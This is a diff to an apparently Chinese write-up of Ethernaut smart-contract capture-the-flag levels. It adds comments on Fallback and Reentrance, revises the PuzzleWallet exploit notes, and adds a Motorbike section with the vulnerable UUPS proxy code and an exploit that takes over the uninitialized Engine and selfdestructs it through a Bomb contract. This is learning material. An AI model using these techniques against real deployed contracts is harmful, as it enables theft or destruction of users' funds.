@@ -89,7 +89,7 @@ contract Fallback {
             msg.sender == owner,
             "caller is not the owner"
         );
-        _;
+        _;  // only used inside a function modifier and it tells Solidity to execute the rest of the code.
     }
 
   function contribute() public payable {
@@ -717,7 +717,7 @@ contract Reentrance {
         if(balances[msg.sender] >= _amount) {
           (bool result,) = msg.sender.call{value:_amount}("");
           if(result) {
-            _amount;
+            _amount;  // does nothing
           }
           balances[msg.sender] -= _amount;
         }
@@ -1950,7 +1950,8 @@ contract PuzzleWallet {
 
 - 由于使用代理调用的方式，代理合约的 `pendingAdmin` 与逻辑合约的 `owner` 共享一个 slot，因而可先通过 `proposeNewAdmin` 更新 `owner`，随后将玩家添加到白名单中
 - 同理，`maxBalance` 与 `admin` 共享一个 slot，而 `maxBalance` 可通过 `setMaxBalance` 更新，但首先需清空代理合约的余额
-- 注意到 `multicall` 中 `depositCalled` 不是状态变量而是本地变量，因而嵌套调用 `multicall` 可绕过限制进行重复 `deposit`
+- `execute` 依据 `balances` 中记录的对应地址的余额进行转账，而 `balances` 只能通过 `deposit` 改变
+- 注意到 `multicall` 中 `depositCalled` 不是状态变量而是函数内变量，因而嵌套调用 `multicall` 可绕过限制利用单次 transfer 进行重复 `deposit`
 
     ```js
     // 部署后将攻击合约添加到白名单中
@@ -1961,7 +1962,7 @@ contract PuzzleWallet {
             wallet = PuzzleWallet(instance);
         }
 
-        // msg.value 设置为代理合约余额的 2 倍
+        // msg.value 设置为 0.001 eth，即代理合约初始余额
         function exploit() external payable {
             bytes[] memory data = new bytes[](2);
             bytes[] memory subdata = new bytes[](1);
@@ -1975,3 +1976,147 @@ contract PuzzleWallet {
     ```
 
 - `delegatecall` 保持合约被调用时的 `msg.value`
+
+## 25. Motorbike
+
+让 `Engine` 自毁，使 `Motorbike` 不可用
+
+```js
+// SPDX-License-Identifier: MIT
+
+pragma solidity <0.7.0;
+
+import "openzeppelin-contracts-06/utils/Address.sol";
+import "openzeppelin-contracts-06/proxy/Initializable.sol";
+
+contract Motorbike {
+    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
+    // constant variable does not have a storage slot
+    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+    
+    struct AddressSlot {
+        address value;
+    }
+    
+    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
+    constructor(address _logic) public {
+        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
+        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
+        (bool success,) = _logic.delegatecall(
+            abi.encodeWithSignature("initialize()")
+        );
+        require(success, "Call failed");
+    }
+
+    // Delegates the current call to `implementation`.
+    function _delegate(address implementation) internal virtual {
+        // solhint-disable-next-line no-inline-assembly
+        assembly {
+            calldatacopy(0, 0, calldatasize())
+            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
+            returndatacopy(0, 0, returndatasize())
+            switch result
+            case 0 { revert(0, returndatasize()) }
+            default { return(0, returndatasize()) }
+        }
+    }
+
+    // Fallback function that delegates calls to the address returned by `_implementation()`. 
+    // Will run if no other function in the contract matches the call data
+    fallback () external payable virtual {
+        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
+    }
+
+    // Returns an `AddressSlot` with member `value` located at `slot`.
+    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
+        assembly {
+            r_slot := slot
+        }
+    }
+}
+
+contract Engine is Initializable {
+    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
+    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+
+    address public upgrader;
+    uint256 public horsePower;
+
+    struct AddressSlot {
+        address value;
+    }
+
+    function initialize() external initializer {
+        horsePower = 1000;
+        upgrader = msg.sender;
+    }
+
+    // Upgrade the implementation of the proxy to `newImplementation`
+    // subsequently execute the function call
+    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
+        _authorizeUpgrade();
+        _upgradeToAndCall(newImplementation, data);
+    }
+
+    // Restrict to upgrader role
+    function _authorizeUpgrade() internal view {
+        require(msg.sender == upgrader, "Can't upgrade");
+    }
+
+    // Perform implementation upgrade with security checks for UUPS(Universal Upgradeable Proxy Standard) proxies, and additional setup call.
+    function _upgradeToAndCall(
+        address newImplementation,
+        bytes memory data
+    ) internal {
+        // Initial upgrade and setup call
+        _setImplementation(newImplementation);
+        if (data.length > 0) {
+            (bool success,) = newImplementation.delegatecall(data);
+            require(success, "Call failed");
+        }
+    }
+    
+    // Stores a new address in the EIP1967 implementation slot.
+    function _setImplementation(address newImplementation) private {
+        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
+        
+        AddressSlot storage r;
+        assembly {
+            r_slot := _IMPLEMENTATION_SLOT
+        }
+        r.value = newImplementation;
+    }
+}
+```
+
+- 与透明代理模式不同，UUPS 代理模式由逻辑合约负责升级逻辑，因而代理合约部署的代价较小
+- `upgrader` 可以使用 `upgradeToAndCall()` 更新逻辑合约并调用
+- `Motorbike` 在部署时通过 `delegatecall` 调用 `Engine` 的 `initialize()`，`initialize()` 使用 `initializer` 函数修饰符，避免再次初始化
+    - `initializer` 修饰符使用状态变量 `initialized` 和 `initializing` 记录初始化状态
+- `initialized` 存储在 `Motorbike` 实例中，而不是 `Engine`，因而可以直接调用 `Engine` 实例的 `initialize()` 再更新其逻辑合约的地址并调用
+- *不要让逻辑合约处于未初始化状态*
+
+### Exploit
+
+```js
+// 获取 Engine 实例的地址
+>> await web3.eth.getStorageAt(instance, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc");
+"0x000000000000000000000000e12c57f61db3891d41ddde5a6669591391ad30ab"
+```
+
+```js
+// 部署新的逻辑合约
+contract Bomb {
+    fallback() external {
+        selfdestruct(tx.origin);
+    }
+}
+// 调用 initialize 成为 upgrader，随后调用 upgradeToAndCall() 更新逻辑合约
+```
+
+### 参考资料
+
+- [UUPS Proxies: Tutorial (Solidity + JavaScript) - Smart Contracts / Guides and Tutorials - OpenZeppelin Forum](https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786)
+- [Proxies - OpenZeppelin Docs](https://docs.openzeppelin.com/contracts/4.x/api/proxy#transparent-vs-uups)
+- [Constant and Immutable State Variables](https://docs.soliditylang.org/en/latest/contracts.html#constants)
+- [Writing Upgradeable Contracts - OpenZeppelin Docs](https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable)
